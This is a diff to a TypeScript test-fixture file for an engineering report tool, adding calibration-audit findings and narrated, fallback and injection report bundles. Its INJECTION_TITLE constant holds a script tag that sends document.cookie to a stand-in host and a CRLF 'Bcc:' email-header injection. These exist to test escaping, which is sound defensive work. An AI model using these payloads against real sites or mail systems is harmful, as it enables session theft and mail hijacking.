@@ -80,9 +80,9 @@ function item(spec: ItemSpec, ordinal: number): StoredReportItem {
       spec.withLadder === true
         ? {
             notches: [
-              { rung: 'R1', label: 'committed', crossed: true, reachable: true, statement: null },
+              { rung: 'R1', label: 'accepted', crossed: true, reachable: true, statement: null },
               { rung: 'R2', label: 'merged', crossed: true, reachable: true, statement: null },
-              { rung: 'R3', label: 'accepted', crossed: true, reachable: true, statement: null },
+              { rung: 'R3', label: 'integrated', crossed: true, reachable: true, statement: null },
               { rung: 'R4', label: 'released', crossed: false, reachable: true, statement: null },
               {
                 rung: 'R5',
@@ -93,9 +93,10 @@ function item(spec: ItemSpec, ordinal: number): StoredReportItem {
               },
             ],
             highestCrossed: 'R3',
-            highestCrossedLabel: 'accepted',
+            highestCrossedLabel: 'integrated',
             highestContiguous: 'R3',
             deploySignalAvailable: false,
+            rungSuffix: 'integrated, not yet released',
           }
         : null,
     payload: {
@@ -299,6 +300,62 @@ const ITEMS: Readonly<Record<string, readonly ItemSpec[]>> = {
   ],
 };
 
+/**
+ * The projection and the Process Calibration Audit, as the pure layer computes them
+ * for the seeded platform team.
+ *
+ * A cycle-time date chosen by `points_uninformative`, at low confidence, with two
+ * verdicts and nothing suppressed — which is the interesting case for the collar: a
+ * real date that the prose beneath it is entitled to undercut, and a threshold
+ * comparison a manager can check.
+ */
+const COLLAR_FINDINGS = {
+  projection: {
+    kind: 'projected',
+    utcDate: '2026-08-08',
+    method: 'cycle_time',
+    selectedByVerdicts: ['points_uninformative'],
+    band: { confidence: 'low', spanDays: 2 },
+    statement:
+      '2026-08-08 to 2026-08-10 — a 2-day band from measured cycle time over 118 finished items. ' +
+      'This is a cycle-time guess, not a velocity forecast.',
+    calibration: {
+      verdict: 'points_uninformative',
+      statement:
+        'Your points have not tracked elapsed working days across 118 completed items — correlation 0.04 over ' +
+        'durations spanning 0 to 9 working days, below the 0.30 Compass needs — so any date below is a cycle-time ' +
+        'guess, not a plan.',
+    },
+  },
+  calibrationAudit: {
+    statement:
+      'Compass audited the data behind this report and reached 2 verdicts: points_uninformative, statuses_stale.',
+    suppressed: [],
+    verdicts: [
+      {
+        name: 'points_uninformative',
+        statistic: 'point_to_elapsed_working_days',
+        value: 444,
+        sampleSize: 118,
+        threshold: { id: 'T12', value: 3_000, unit: 'basis_points' },
+        statement:
+          'Across 118 completed items your points correlate with elapsed working days at 0.04. T12 needs 0.30, so ' +
+          'your points are not telling you how long work takes.',
+      },
+      {
+        name: 'statuses_stale',
+        statistic: 'stale_status_incidence',
+        value: 7_727,
+        sampleSize: 22,
+        threshold: { id: 'T24', value: 2_000, unit: 'basis_points' },
+        statement:
+          '17 of 22 in-progress items — 77% — have sat still for 3 working days or more with no commit and no pull ' +
+          'request. T24 fires at 20%, so the board is not describing where the work actually is.',
+      },
+    ],
+  },
+} as const;
+
 export function storedBundle(): StoredReportBundle {
   evidenceCounter = 0;
 
@@ -333,15 +390,103 @@ export function storedBundle(): StoredReportBundle {
       timezone: TIMEZONE,
       window: WINDOW,
       contentHash: 'a'.repeat(64),
-      payloadJson: '{}',
-      payload: {},
+      payloadJson: JSON.stringify({ findings: COLLAR_FINDINGS }),
+      // The collar is derived from the stored structured report rather than from the
+      // section rows, exactly as the alignment panel is derived from the item payload.
+      // So the fixture has to carry the findings, or the page would render the
+      // "this report predates the audit" absence and the collar assertions would be
+      // testing the fallback instead of the object.
+      payload: { findings: COLLAR_FINDINGS },
       prose: 'the whole report',
       rendererId: 'template',
+      fallbackRenderer: false,
+      fallbackReason: null,
       coverageStatus: 'partial',
       ingestRunId: 'run-1',
       generatedAt: REPORT_INSTANT,
     },
     sections,
+  };
+}
+
+/**
+ * A narrated report: the same claims, with a model's prose over the top.
+ *
+ * The section prose is what a narrator would have written — one lead, then the
+ * items in an order it chose — and it deliberately contains the three inline
+ * markdown forms the allowlist recognises, so the view test proves they render as
+ * elements rather than as literal asterisks.
+ */
+export function narratedBundle(): StoredReportBundle {
+  const bundle = storedBundle();
+  return {
+    ...bundle,
+    report: { ...bundle.report, rendererId: 'narrated' },
+    sections: bundle.sections.map((section) => ({
+      ...section,
+      prose:
+        section.items.length === 0
+          ? section.emptyStatement
+          : `**${section.title}** has ${section.items.length} thing worth your attention this morning.\n\n` +
+            `${section.items.map((entry) => entry.headline).join(' ')} *age unchanged*, and \`${section.sectionKey}\` is where it sits.`,
+    })),
+  };
+}
+
+/**
+ * A report whose narration was rejected, and which says so.
+ *
+ * This is the shape the page has to disclose rather than hide: complete, correct,
+ * every figure linked — and templated, because a model asserted something the
+ * payload did not contain.
+ */
+export function fallbackBundle(): StoredReportBundle {
+  const bundle = storedBundle();
+  return {
+    ...bundle,
+    report: {
+      ...bundle.report,
+      rendererId: 'template',
+      fallbackRenderer: true,
+      fallbackReason:
+        '`risks` could not be grounded in 3 attempts; last rejection named `#999917`, `Wendell Fitzcarraldo`',
+    },
+  };
+}
+
+/**
+ * A ticket titled with a script tag and an email-header injection payload.
+ *
+ * Both halves are real attacks against real surfaces: the `<script>` is aimed at
+ * the web view, and the `\r\nBcc:` at the email renderer's header assembly. They are
+ * carried on one item so a single fixture covers the criterion for both, and the
+ * payload sits in the *headline* because that is the field a ticket title actually
+ * reaches.
+ */
+export const INJECTION_TITLE =
+  '<script>fetch("https://evil.test/"+document.cookie)</script>\r\nBcc: attacker@evil.test';
+
+export function injectionBundle(): StoredReportBundle {
+  const bundle = storedBundle();
+  const [first, ...rest] = bundle.sections;
+  if (first === undefined) throw new Error('The fixture bundle has no sections.');
+
+  const [firstItem, ...otherItems] = first.items;
+  if (firstItem === undefined) throw new Error('The fixture bundle has no Yesterday item.');
+
+  return {
+    ...bundle,
+    sections: [
+      {
+        ...first,
+        // Narrated, so the prose the page renders is the attacker-influenced text
+        // rather than a sentence the template renderer composed around it.
+        prose: `DEV-501 — ${INJECTION_TITLE} — reached R3 integrated.`,
+        items: [{ ...firstItem, headline: `DEV-501 — ${INJECTION_TITLE}`, prose: `DEV-501 — ${INJECTION_TITLE}.` }, ...otherItems],
+      },
+      ...rest,
+    ],
+    report: { ...bundle.report, rendererId: 'narrated' },
   };
 }
 
